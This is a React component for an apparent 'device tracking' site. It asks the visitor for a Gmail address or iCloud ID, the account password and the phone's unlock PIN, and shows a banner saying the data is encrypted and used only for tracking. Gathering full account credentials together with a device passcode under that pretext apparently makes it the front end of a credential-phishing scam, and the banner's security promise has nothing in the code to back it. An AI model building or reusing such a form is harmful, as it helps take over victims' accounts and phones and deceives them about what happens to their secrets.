import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Key, Eye, EyeOff } from "lucide-react";
import { useState } from "react";
import { Platform } from "@/lib/device-data";

interface UserIdentifierProps {
  platform: Platform;
  identifier: string;
  password: string;
  lockCode: string;
  onIdentifierChange: (identifier: string) => void;
  onPasswordChange: (password: string) => void;
  onLockCodeChange: (lockCode: string) => void;
  onAuthenticate: () => void;
  isVisible: boolean;
}

export function UserIdentifier({ 
  platform, 
  identifier,
  password,
  lockCode,
  onIdentifierChange,
  onPasswordChange,
  onLockCodeChange,
  onAuthenticate, 
  isVisible 
}: UserIdentifierProps) {
  const [showPassword, setShowPassword] = useState(false);
  
  if (!isVisible || !platform) return null;

  const isAndroid = platform === 'android';
  const labelText = isAndroid ? 'Gmail Address' : 'iCloud ID';
  const placeholder = isAndroid ? 'Enter your Gmail address' : 'Enter your iCloud ID';

  const isFormValid = identifier.trim() && password.trim() && lockCode.trim();

  return (
    <div className="mb-8 animate-in slide-in-from-bottom-5 duration-300">
      <Card className="bg-slate-800/50 backdrop-blur-lg border-slate-700/50">
        <CardContent className="p-8">
          <h2 className="text-2xl font-bold mb-6 flex items-center">
            <Key className="text-blue-400 mr-3" size={24} />
            Account Information
          </h2>
          
          <div className="max-w-md space-y-4">
            <div>
              <Label className="block text-sm font-medium mb-2 text-slate-300">
                {labelText}
              </Label>
              <Input
                type="email"
                value={identifier}
                onChange={(e) => onIdentifierChange(e.target.value)}
                placeholder={placeholder}
                className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>

            <div>
              <Label className="block text-sm font-medium mb-2 text-slate-300">
                Account Password
              </Label>
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => onPasswordChange(e.target.value)}
                  placeholder="Enter your account password"
                  className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent pr-12"
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="icon"
                  className="absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 text-slate-400 hover:text-slate-200"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </Button>
              </div>
            </div>

            <div>
              <Label className="block text-sm font-medium mb-2 text-slate-300">
                Phone Lock Code
              </Label>
              <Input
                type="password"
                value={lockCode}
                onChange={(e) => onLockCodeChange(e.target.value)}
                placeholder="Enter your phone's unlock code/PIN"
                className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                maxLength={10}
              />
            </div>

            <div className="bg-amber-500/20 border border-amber-500/30 rounded-lg p-4">
              <p className="text-amber-300 text-sm">
                🔒 <strong>Secure Processing:</strong> Your information is encrypted and used only for device tracking purposes.
              </p>
            </div>
            
            <Button 
              onClick={onAuthenticate}
              disabled={!isFormValid}
              className="w-full mt-4 bg-blue-500 hover:bg-blue-600 text-white font-medium py-3 px-6 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Begin Authentication
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
